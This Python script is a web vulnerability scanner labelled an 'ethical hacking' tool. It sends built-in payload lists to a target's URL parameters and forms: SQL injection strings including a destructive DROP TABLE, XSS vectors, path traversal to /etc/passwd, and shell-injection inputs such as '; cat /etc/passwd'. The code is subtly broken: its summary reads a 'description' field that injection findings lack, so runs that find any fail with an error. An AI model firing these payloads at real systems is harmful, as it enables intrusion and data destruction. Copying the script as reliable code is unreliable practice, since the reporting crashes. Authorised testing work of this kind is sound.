#!/usr/bin/env python3
"""
Exploitation Scripts - Ethical Hacking Tools Suite
Educational and Testing Purposes Only

Automated testing for common vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- HTTP Header vulnerabilities
- Directory traversal
- Command injection
"""

import requests
import re
import time
import argparse
from urllib.parse import urljoin, urlparse, quote, unquote
from bs4 import BeautifulSoup
import json
import threading
from datetime import datetime

from ethical_hacking_tools.utils.logger import setup_logger, log_security_event

class ExploitationTester:
    """
    Automated exploitation testing tool
    """
    
    def __init__(self):
        self.logger = setup_logger('exploitation_tester')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users; --",
            "' OR 'x'='x",
            "1' OR '1'='1' --",
            "admin'--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "/etc/passwd%00",
            "..\\..\\..\\..\\..\\..\\etc\\passwd",
            "....//....//....//....//....//etc/passwd"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& id",
            "`whoami`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1"
        ]
        
        self.vulnerabilities_found = []
        
        print("[!] WARNING: Exploitation testing is for educational purposes only!")
        print("[!] Use only on systems you own or have explicit permission to test!")
        print("[!] Unauthorized testing may violate laws and regulations!")
    
    def test_sql_injection(self, url, parameters=None):
        """
        Test for SQL injection vulnerabilities
        """
        self.logger.info(f"Testing SQL injection on {url}")
        print(f"\n[+] Testing SQL injection on {url}")
        
        vulnerabilities = []
        
        try:
            # Test URL parameters
            if parameters:
                for param_name, param_value in parameters.items():
                    print(f"[+] Testing parameter: {param_name}")
                    
                    for payload in self.sql_payloads:
                        test_params = parameters.copy()
                        test_params[param_name] = payload
                        
                        try:
                            response = self.session.get(url, params=test_params, timeout=10)
                            
                            if self.detect_sql_injection_response(response):
                                vuln = {
                                    'type': 'SQL Injection',
                                    'severity': 'High',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': response.url,
                                    'response_code': response.status_code
                                }
                                vulnerabilities.append(vuln)
                                print(f"[!] SQL Injection found in parameter '{param_name}'")
                                print(f"[!] Payload: {payload}")
                                
                                log_security_event(
                                    self.logger,
                                    'sql_injection_found',
                                    url,
                                    f"Parameter: {param_name}, Payload: {payload}"
                                )
                                break
                        
                        except requests.exceptions.RequestException as e:
                            self.logger.error(f"Error testing SQL injection: {e}")
                            continue
            
            # Test POST data
            if not parameters:
                print("[+] Testing POST data for SQL injection...")
                
                # Try to find forms
                try:
                    response = self.session.get(url, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = {}
                        inputs = form.find_all(['input', 'textarea', 'select'])
                        
                        for input_tag in inputs:
                            name = input_tag.get('name')
                            if name:
                                form_data[name] = 'test'
                        
                        if form_data:
                            for param_name in form_data.keys():
                                for payload in self.sql_payloads:
                                    test_data = form_data.copy()
                                    test_data[param_name] = payload
                                    
                                    try:
                                        response = self.session.post(url, data=test_data, timeout=10)
                                        
                                        if self.detect_sql_injection_response(response):
                                            vuln = {
                                                'type': 'SQL Injection',
                                                'severity': 'High',
                                                'parameter': param_name,
                                                'payload': payload,
                                                'url': url,
                                                'response_code': response.status_code
                                            }
                                            vulnerabilities.append(vuln)
                                            print(f"[!] SQL Injection found in POST parameter '{param_name}'")
                                            print(f"[!] Payload: {payload}")
                                            break
                                    
                                    except requests.exceptions.RequestException:
                                        continue
                
                except Exception as e:
                    self.logger.error(f"Error testing POST SQL injection: {e}")
        
        except Exception as e:
            self.logger.error(f"Error in SQL injection testing: {e}")
        
        return vulnerabilities
    
    def detect_sql_injection_response(self, response):
        """
        Detect SQL injection based on response
        """
        error_patterns = [
            r"mysql_fetch_array\(\)",
            r"ORA-\d+",
            r"Microsoft.*ODBC.*SQL Server",
            r"SQLServer JDBC Driver",
            r"PostgreSQL.*ERROR",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_query\(\)",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
            r"Unknown column.*in.*field list",
            r"Table.*doesn't exist",
            r"Access denied for user",
            r"ORA-01756",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
            r"unclosed quotation mark after the character string"
        ]
        
        response_text = response.text.lower()
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def test_xss(self, url, parameters=None):
        """
        Test for Cross-Site Scripting vulnerabilities
        """
        self.logger.info(f"Testing XSS on {url}")
        print(f"\n[+] Testing XSS on {url}")
        
        vulnerabilities = []
        
        try:
            # Test URL parameters
            if parameters:
                for param_name, param_value in parameters.items():
                    print(f"[+] Testing parameter: {param_name}")
                    
                    for payload in self.xss_payloads:
                        test_params = parameters.copy()
                        test_params[param_name] = payload
                        
                        try:
                            response = self.session.get(url, params=test_params, timeout=10)
                            
                            if self.detect_xss_response(response, payload):
                                vuln = {
                                    'type': 'Cross-Site Scripting (XSS)',
                                    'severity': 'High',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': response.url,
                                    'response_code': response.status_code
                                }
                                vulnerabilities.append(vuln)
                                print(f"[!] XSS found in parameter '{param_name}'")
                                print(f"[!] Payload: {payload}")
                                
                                log_security_event(
                                    self.logger,
                                    'xss_found',
                                    url,
                                    f"Parameter: {param_name}, Payload: {payload}"
                                )
                                break
                        
                        except requests.exceptions.RequestException as e:
                            self.logger.error(f"Error testing XSS: {e}")
                            continue
            
            # Test POST data
            if not parameters:
                print("[+] Testing POST data for XSS...")
                
                try:
                    response = self.session.get(url, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = {}
                        inputs = form.find_all(['input', 'textarea', 'select'])
                        
                        for input_tag in inputs:
                            name = input_tag.get('name')
                            if name:
                                form_data[name] = 'test'
                        
                        if form_data:
                            for param_name in form_data.keys():
                                for payload in self.xss_payloads:
                                    test_data = form_data.copy()
                                    test_data[param_name] = payload
                                    
                                    try:
                                        response = self.session.post(url, data=test_data, timeout=10)
                                        
                                        if self.detect_xss_response(response, payload):
                                            vuln = {
                                                'type': 'Cross-Site Scripting (XSS)',
                                                'severity': 'High',
                                                'parameter': param_name,
                                                'payload': payload,
                                                'url': url,
                                                'response_code': response.status_code
                                            }
                                            vulnerabilities.append(vuln)
                                            print(f"[!] XSS found in POST parameter '{param_name}'")
                                            print(f"[!] Payload: {payload}")
                                            break
                                    
                                    except requests.exceptions.RequestException:
                                        continue
                
                except Exception as e:
                    self.logger.error(f"Error testing POST XSS: {e}")
        
        except Exception as e:
            self.logger.error(f"Error in XSS testing: {e}")
        
        return vulnerabilities
    
    def detect_xss_response(self, response, payload):
        """
        Detect XSS based on response
        """
        # Check if payload is reflected in response
        if payload in response.text:
            return True
        
        # Check for common XSS patterns
        xss_patterns = [
            r"<script[^>]*>.*alert.*</script>",
            r"<img[^>]*onerror.*>",
            r"<svg[^>]*onload.*>",
            r"javascript:alert",
            r"<iframe[^>]*src.*javascript.*>",
            r"<body[^>]*onload.*>",
            r"<input[^>]*onfocus.*>",
            r"<select[^>]*onfocus.*>",
            r"<textarea[^>]*onfocus.*>"
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False
    
    def test_lfi(self, url, parameters=None):
        """
        Test for Local File Inclusion vulnerabilities
        """
        self.logger.info(f"Testing LFI on {url}")
        print(f"\n[+] Testing LFI on {url}")
        
        vulnerabilities = []
        
        try:
            if parameters:
                for param_name, param_value in parameters.items():
                    print(f"[+] Testing parameter: {param_name}")
                    
                    for payload in self.lfi_payloads:
                        test_params = parameters.copy()
                        test_params[param_name] = payload
                        
                        try:
                            response = self.session.get(url, params=test_params, timeout=10)
                            
                            if self.detect_lfi_response(response):
                                vuln = {
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'High',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': response.url,
                                    'response_code': response.status_code
                                }
                                vulnerabilities.append(vuln)
                                print(f"[!] LFI found in parameter '{param_name}'")
                                print(f"[!] Payload: {payload}")
                                
                                log_security_event(
                                    self.logger,
                                    'lfi_found',
                                    url,
                                    f"Parameter: {param_name}, Payload: {payload}"
                                )
                                break
                        
                        except requests.exceptions.RequestException as e:
                            self.logger.error(f"Error testing LFI: {e}")
                            continue
        
        except Exception as e:
            self.logger.error(f"Error in LFI testing: {e}")
        
        return vulnerabilities
    
    def detect_lfi_response(self, response):
        """
        Detect LFI based on response
        """
        lfi_patterns = [
            r"root:.*:0:0:",
            r"bin:.*:1:1:",
            r"daemon:.*:2:2:",
            r"# Copyright \(c\)",
            r"# localhost name resolution",
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
            r"# This file contains the mappings",
            r"# For example:",
            r"# 102\.254\.\d+\.\d+\s+",
            r"# The following lines are desirable for IPv6 capable hosts",
            r"# ::1\s+localhost ip6-localhost ip6-loopback"
        ]
        
        for pattern in lfi_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False
    
    def test_command_injection(self, url, parameters=None):
        """
        Test for Command Injection vulnerabilities
        """
        self.logger.info(f"Testing Command Injection on {url}")
        print(f"\n[+] Testing Command Injection on {url}")
        
        vulnerabilities = []
        
        try:
            if parameters:
                for param_name, param_value in parameters.items():
                    print(f"[+] Testing parameter: {param_name}")
                    
                    for payload in self.command_injection_payloads:
                        test_params = parameters.copy()
                        test_params[param_name] = payload
                        
                        try:
                            response = self.session.get(url, params=test_params, timeout=10)
                            
                            if self.detect_command_injection_response(response):
                                vuln = {
                                    'type': 'Command Injection',
                                    'severity': 'Critical',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': response.url,
                                    'response_code': response.status_code
                                }
                                vulnerabilities.append(vuln)
                                print(f"[!] Command Injection found in parameter '{param_name}'")
                                print(f"[!] Payload: {payload}")
                                
                                log_security_event(
                                    self.logger,
                                    'command_injection_found',
                                    url,
                                    f"Parameter: {param_name}, Payload: {payload}"
                                )
                                break
                        
                        except requests.exceptions.RequestException as e:
                            self.logger.error(f"Error testing Command Injection: {e}")
                            continue
        
        except Exception as e:
            self.logger.error(f"Error in Command Injection testing: {e}")
        
        return vulnerabilities
    
    def detect_command_injection_response(self, response):
        """
        Detect Command Injection based on response
        """
        command_patterns = [
            r"uid=\d+.*gid=\d+",
            r"total \d+",
            r"drwxr-xr-x",
            r"-rw-r--r--",
            r"PING \d+\.\d+\.\d+\.\d+",
            r"64 bytes from",
            r"rtt min/avg/max/mdev",
            r"bin\s+dev\s+etc\s+home",
            r"root\s+bin\s+daemon",
            r"localhost\s+127\.0\.0\.1"
        ]
        
        for pattern in command_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False
    
    def test_http_headers(self, url):
        """
        Test for HTTP header vulnerabilities
        """
        self.logger.info(f"Testing HTTP headers on {url}")
        print(f"\n[+] Testing HTTP headers on {url}")
        
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = [
                'X-Frame-Options',
                'X-Content-Type-Options',
                'X-XSS-Protection',
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'Referrer-Policy'
            ]
            
            missing_headers = []
            for header in security_headers:
                if header not in headers:
                    missing_headers.append(header)
            
            if missing_headers:
                vuln = {
                    'type': 'Missing Security Headers',
                    'severity': 'Medium',
                    'description': f'Missing headers: {", ".join(missing_headers)}',
                    'url': url,
                    'missing_headers': missing_headers
                }
                vulnerabilities.append(vuln)
                print(f"[!] Missing security headers: {', '.join(missing_headers)}")
            
            # Check for information disclosure
            if 'Server' in headers:
                vuln = {
                    'type': 'Information Disclosure',
                    'severity': 'Low',
                    'description': f'Server information disclosed: {headers["Server"]}',
                    'url': url,
                    'server': headers['Server']
                }
                vulnerabilities.append(vuln)
                print(f"[!] Server information disclosed: {headers['Server']}")
        
        except Exception as e:
            self.logger.error(f"Error testing HTTP headers: {e}")
        
        return vulnerabilities
    
    def test(self, target_url, vulnerability_type=None):
        """
        Main testing function
        """
        print(f"\n{'='*60}")
        print("EXPLOITATION TESTER - ETHICAL HACKING TOOLS")
        print(f"{'='*60}")
        print(f"[!] WARNING: Use only on systems you own or have permission to test!")
        print(f"[!] Educational and testing purposes only!")
        
        start_time = time.time()
        all_vulnerabilities = []
        
        try:
            # Parse URL and parameters
            parsed_url = urlparse(target_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            # Extract parameters
            parameters = {}
            if parsed_url.query:
                for param in parsed_url.query.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        parameters[key] = unquote(value)
            
            print(f"[+] Target: {target_url}")
            print(f"[+] Base URL: {base_url}")
            if parameters:
                print(f"[+] Parameters: {parameters}")
            
            # Test based on vulnerability type
            if vulnerability_type == 'sql' or vulnerability_type is None:
                sql_vulns = self.test_sql_injection(base_url, parameters)
                all_vulnerabilities.extend(sql_vulns)
            
            if vulnerability_type == 'xss' or vulnerability_type is None:
                xss_vulns = self.test_xss(base_url, parameters)
                all_vulnerabilities.extend(xss_vulns)
            
            if vulnerability_type == 'lfi' or vulnerability_type is None:
                lfi_vulns = self.test_lfi(base_url, parameters)
                all_vulnerabilities.extend(lfi_vulns)
            
            if vulnerability_type == 'command' or vulnerability_type is None:
                cmd_vulns = self.test_command_injection(base_url, parameters)
                all_vulnerabilities.extend(cmd_vulns)
            
            if vulnerability_type == 'headers' or vulnerability_type is None:
                header_vulns = self.test_http_headers(base_url)
                all_vulnerabilities.extend(header_vulns)
            
            # Summary
            total_time = time.time() - start_time
            
            print(f"\n{'='*60}")
            print("TESTING SUMMARY")
            print(f"{'='*60}")
            print(f"Target: {target_url}")
            print(f"Total time: {total_time:.2f} seconds")
            print(f"Vulnerabilities found: {len(all_vulnerabilities)}")
            
            if all_vulnerabilities:
                print(f"\nVULNERABILITIES FOUND:")
                print("-" * 40)
                
                # Group by severity
                critical_vulns = [v for v in all_vulnerabilities if v['severity'] == 'Critical']
                high_vulns = [v for v in all_vulnerabilities if v['severity'] == 'High']
                medium_vulns = [v for v in all_vulnerabilities if v['severity'] == 'Medium']
                low_vulns = [v for v in all_vulnerabilities if v['severity'] == 'Low']
                
                for severity, vulns in [('CRITICAL', critical_vulns), ('HIGH', high_vulns), 
                                      ('MEDIUM', medium_vulns), ('LOW', low_vulns)]:
                    if vulns:
                        print(f"\n{severity} SEVERITY:")
                        for i, vuln in enumerate(vulns, 1):
                            print(f"  {i}. {vuln['type']}")
                            print(f"     Description: {vuln['description']}")
                            if 'parameter' in vuln:
                                print(f"     Parameter: {vuln['parameter']}")
                            if 'payload' in vuln:
                                print(f"     Payload: {vuln['payload']}")
                            print(f"     URL: {vuln['url']}")
                            print()
            else:
                print(f"\n[+] No vulnerabilities found!")
            
            return all_vulnerabilities
            
        except Exception as e:
            self.logger.error(f"Error in testing process: {e}")
            print(f"[!] Error: {e}")
            return []

def main():
    """
    Command line interface for Exploitation Tester
    """
    parser = argparse.ArgumentParser(description='Exploitation Tester - Ethical Hacking Tools')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-v', '--vulnerability', 
                       choices=['sql', 'xss', 'lfi', 'command', 'headers'],
                       help='Specific vulnerability type to test')
    
    args = parser.parse_args()
    
    tester = ExploitationTester()
    tester.test(args.target, args.vulnerability)

if __name__ == "__main__":
    main()
